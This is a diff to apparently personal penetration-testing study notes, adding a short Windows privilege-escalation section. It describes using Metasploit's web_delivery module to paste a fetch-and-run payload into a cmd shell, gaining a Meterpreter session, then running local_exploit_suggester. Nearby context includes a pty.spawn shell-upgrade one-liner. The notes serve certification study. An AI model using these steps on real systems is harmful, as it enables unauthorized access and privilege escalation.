@@ -313,6 +313,14 @@ here is all kernel exploitation from GitHub: https://github.com/SecWiki/windows-
 -     C:\>c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
 -     python -c 'import pty; pty.spawn("/bin/bash")'
 - check the history or sudo -l and continue linux enum
+
+4- Impersonation 
+if you get a cmd shell and you can't upload any file on the system use msfconsole for the privilege escaliton
+use /exploit/multi/script/web_delivery
+set SRVHOST | PAYLOAD | LHOST | LPORT | TARGET then run
+copy any paste the payload into the cmd shell. you should have a new session
+after getting the meterpreter session run post/multi/recon/local_exploit_suggester
+use any of the suggested exploits and run it
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Platforms
 1. for Initial Access work on eJPT, This article and official content 
